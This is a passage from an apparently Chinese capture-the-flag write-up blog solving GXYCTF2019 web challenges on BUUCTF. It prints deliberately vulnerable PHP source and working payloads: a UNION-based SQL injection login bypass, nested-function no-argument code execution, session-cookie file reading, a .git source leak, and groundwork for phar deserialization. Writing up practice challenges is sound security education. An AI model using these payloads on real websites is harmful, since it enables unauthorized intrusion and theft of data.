class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;title&gt;Do you know who am I?&lt;/title&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">require &quot;config.php&quot;;</span><br><span class="line">require &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">// 去除转义</span><br><span class="line">if (get_magic_quotes_gpc()) &#123;</span><br><span class="line">	function stripslashes_deep($value)</span><br><span class="line">	&#123;</span><br><span class="line">		$value = is_array($value) ?</span><br><span class="line">		array_map(&#x27;stripslashes_deep&#x27;, $value) :</span><br><span class="line">		stripslashes($value);</span><br><span class="line">		return $value;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$_POST = array_map(&#x27;stripslashes_deep&#x27;, $_POST);</span><br><span class="line">	$_GET = array_map(&#x27;stripslashes_deep&#x27;, $_GET);</span><br><span class="line">	$_COOKIE = array_map(&#x27;stripslashes_deep&#x27;, $_COOKIE);</span><br><span class="line">	$_REQUEST = array_map(&#x27;stripslashes_deep&#x27;, $_REQUEST);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysqli_query($con,&#x27;SET NAMES UTF8&#x27;);</span><br><span class="line">$name = $_POST[&#x27;name&#x27;];</span><br><span class="line">$password = $_POST[&#x27;pw&#x27;];</span><br><span class="line">$t_pw = md5($password);</span><br><span class="line">$sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;;</span><br><span class="line">// echo $sql;</span><br><span class="line">$result = mysqli_query($con, $sql);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;/\(|\)|\=|or/&quot;, $name))&#123;</span><br><span class="line">	die(&quot;do not hack me!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	if (!$result) &#123;</span><br><span class="line">		printf(&quot;Error: %s\n&quot;, mysqli_error($con));</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		// echo &#x27;&lt;pre&gt;&#x27;;</span><br><span class="line">		$arr = mysqli_fetch_row($result);</span><br><span class="line">		// print_r($arr);</span><br><span class="line">		if($arr[1] == &quot;admin&quot;)&#123;</span><br><span class="line">			if(md5($password) == $arr[2])&#123;</span><br><span class="line">				echo $flag;</span><br><span class="line">			&#125;</span><br><span class="line">			else&#123;</span><br><span class="line">				die(&quot;wrong pass!&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			die(&quot;wrong user!&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>那我们就构造虚拟的数据</p>
+<p>name&#x3D;1’ union select 1,’admin’,’c4ca4238a0b923820dcc509a6f75849b’#&amp;pw&#x3D;1</p>
+<p>这里c4ca4238a0b923820dcc509a6f75849b是1的md5加密值</p>
+<p>这里利用的知识点不多，但是如果不看源代码的话估计到死都做不出来这道题</p>
+<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p><img src="/./../image/achieve/202411/GXYCTF/image-20241115002008584.png" alt="image-20241115002008584"></p>
+<p>是一点线索都不给啊</p>
+<p>用御剑扫了一下目录，但也没什么收获</p>
+<p>参考了各位师傅的wp后发现是.git泄露</p>
+<p>用githack把泄露的代码摘下来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python githack.py url/.git/</span><br></pre></td></tr></table></figure>
+
+<p>摘下来的代码会放在githack目录下</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241115222634445.png" alt="image-20241115222634445"></p>
+<p>进入b4d0310f-0918-425b-8f37-c1069fc45ecf.node5.buuoj.cn_81文件可以看到有index.php，说明源代码被我们摘下来了</p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>preg_match(‘&#x2F;data://|filter://|php://|phar://&#x2F;i’, $_GET[‘exp’])–这里过滤了大部分的伪协议，比如 <code>data://</code>、<code>filter://</code>、<code>php://</code> 和 <code>phar://</code></p>
+<p>if (‘;’ &#x3D;&#x3D;&#x3D; preg_replace(‘&#x2F;[a-z,_]+((?R)?)&#x2F;‘, NULL, $_GET[‘exp’]))–这里的匹配替换一个字符+符号+加上对括号的递归调用，例如以下</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/20210325204736-46bca358-8d68-1.png" alt="img"></p>
+<p>判断匹配替换后的 结果是不是为;，说明这里我们只能让传入的exp是仅包含函数调用的形式，替换结果才会为;，比如func();，而不应该有其他字符</p>
+<p>if (!preg_match(‘&#x2F;et|na|info|dec|bin|hex|oct|pi|log&#x2F;i’, $_GET[‘exp’])) –这里进一步检查输入中的字符是否包含关键字</p>
+<h3 id="解题思路-函数嵌套实现无参数rce"><a href="#解题思路-函数嵌套实现无参数rce" class="headerlink" title="解题思路:函数嵌套实现无参数rce"></a>解题思路:函数嵌套实现无参数rce</h3><p>明确了是需要实现无参数rce的话，那我们得通过第三层验证考虑哪些函数可以用了，</p>
+<p>preg_match(‘&#x2F;et|na|info|dec|bin|hex|oct|pi|log&#x2F;i’, $_GET[‘exp’])</p>
+<h4 id="payload1-读取文件"><a href="#payload1-读取文件" class="headerlink" title="payload1:读取文件"></a>payload1:读取文件</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure>
+
+<p>highlight_file() 函数对文件进行语法高亮显示，本函数是show_source() 的别名<br>next() 输出数组中的当前元素和下一个元素的值。<br>array_reverse() 函数以相反的元素顺序返回数组。(主要是能返回值)<br>scandir() 函数返回指定目录中的文件和目录的数组。<br>pos() 输出数组中的当前元素的值。<br>localeconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是”.”。</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241116104609373.png" alt="image-20241116104609373"></p>
+<h4 id="payload2-数组操作"><a href="#payload2-数组操作" class="headerlink" title="payload2:数组操作"></a>payload2:数组操作</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?exp=var_dump(scandir(pos(localeconv())));</span><br><span class="line">array(5) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(4) &quot;.git&quot; [3]=&gt; string(8) &quot;flag.php&quot; [4]=&gt; string(9) &quot;index.php&quot; &#125;</span><br><span class="line"></span><br><span class="line">?exp=var_dump(array_reverse(scandir(pos(localeconv()))));</span><br><span class="line">array(5) &#123; [0]=&gt; string(9) &quot;index.php&quot; [1]=&gt; string(8) &quot;flag.php&quot; [2]=&gt; string(4) &quot;.git&quot; [3]=&gt; string(2) &quot;..&quot; [4]=&gt; string(1) &quot;.&quot; &#125;</span><br><span class="line"></span><br><span class="line">?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p><code>pos() / current()</code> 默认返回数组第一个元素<br><code>end()</code> ： 将内部指针指向数组中的最后一个元素，并输出<br><code>next()</code> ：将内部指针指向数组中的下一个元素，并输出<br><code>prev()</code> ：将内部指针指向数组中的上一个元素，并输出<br><code>reset()</code> ： 将内部指针指向数组中的第一个元素，并输出<br><code>each()</code> ： 返回当前元素的键名和键值，并将内部指针向前移动</p>
+<p><code>pos()</code> 输出数组中的当前元素的值。</p>
+<p><code>localeconv()</code> 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是”.”。</p>
+<p><code>array_reverse()</code>函数将数组逆向返回</p>
+<h4 id="payload3：session-id"><a href="#payload3：session-id" class="headerlink" title="payload3：session_id"></a>payload3：session_id</h4><p>通过获取session_id设置为flag.php来获取flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>()));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Request:</span><br><span class="line"></span><br><span class="line">GET /?exp=highlight_file(session_id(session_start())); HTTP/1.1</span><br><span class="line">Host: 5e48725e-b21b-41a7-96d1-398a11a05f3d.node5.buuoj.cn:81</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">cookie:PHPSESSID=flag.php</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p><img src="/./../image/achieve/202411/GXYCTF/image-20241116173131330.png" alt="image-20241116173131330"></p>
+<p>算出来填进去看看回显</p>
+<p>发现每次的计算都不一样，那bp抓包提交应该是不行的了，只能写个脚本</p>
+<h3 id="加减法计算脚本"><a href="#加减法计算脚本" class="headerlink" title="加减法计算脚本"></a>加减法计算脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">count</span>():</span><br><span class="line">    s = requests.session()</span><br><span class="line">    url = <span class="string">&#x27;http://c39b6aaa-4d51-4b1d-b777-32741c72ccc8.node3.buuoj.cn/&#x27;</span></span><br><span class="line">    <span class="keyword">match</span> = re.<span class="built_in">compile</span>(<span class="string">r&quot;[0-9]+ [+|-] [0-9]+&quot;</span>)</span><br><span class="line">    r = s.get(url)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1001</span>):</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="built_in">str</span> = <span class="keyword">match</span>.findall(r.text)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># print(eval(str))</span></span><br><span class="line">        data = &#123;<span class="string">&quot;answer&quot;</span> : <span class="built_in">eval</span>(<span class="built_in">str</span>)&#125;</span><br><span class="line">        r = s.post(url, data=data)</span><br><span class="line">        r.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i,<span class="built_in">eval</span>(<span class="built_in">str</span>)))</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    count()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>如果觉得慢的话可以写多线程的或者设置延时时间，这样会快得多，但也容易出现429</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241121205803605.png" alt="image-20241121205803605"></p>
+<h2 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h2><p><img src="/./../image/achieve/202411/GXYCTF/image-20241121210117323.png" alt="image-20241121210117323"></p>
+<p>弱口令登录一下，发现就登录成功了</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241121210544355.png" alt="image-20241121210544355"></p>
+<p>一开始以为是一道文件上传题目，但是打半天没打通，后来才发现是一道phar反序列化</p>
+<p>先看url，发现有file&#x3D;的格式，猜测是文件包含，直接在后面加上.php看看</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241123215639970.png" alt="image-20241123215639970"></p>
+<p>无语了。。。我们用伪协议读试试</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241123220409844.png" alt="image-20241123220409844"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt; </span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">	上传文件</span><br><span class="line">	&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">	&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;上传&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$sandbox</span> = <span class="title function_ invoke__">getcwd</span>().<span class="string">&quot;/uploads/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">		<span class="variable">$ext</span> = <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">		@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$sandbox</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>].<span class="variable">$ext</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;token = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="variable">$this</span>-&gt;Filename))&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">				<span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (′▽`〃)&#x27;);&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="variable language_">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line">		<span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Filename;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token != <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$uploader</span> = <span class="keyword">new</span> <span class="title class_">Uploader</span>();</span><br><span class="line">	<span class="variable">$uploader</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">	<span class="keyword">if</span>(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;下面是你上传的文件：&lt;br&gt;&quot;</span>.<span class="variable">$uploader</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>同样也可以得到home.php</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241123220022096.png" alt="image-20241123220022096"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=utf-8\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.?f.?l.?a.?g.?/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/home$/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/upload$/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">				<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.fxxkyou!&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;当前引用的是 &quot;</span>.<span class="variable">$file</span>;</span><br><span class="line">			<span class="keyword">require</span> <span class="variable">$file</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;no permission!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>home.php代码看上去是对文件上传的一个过滤，但是在upload.php中是关于类和方法的，感觉是反序列化问题，没有反序列化函数但是又涉及到文件上传，结合两个来看就是一道phar反序列化</p>
+<p>我们先来分析一下upload.php中反序列化的内容</p>
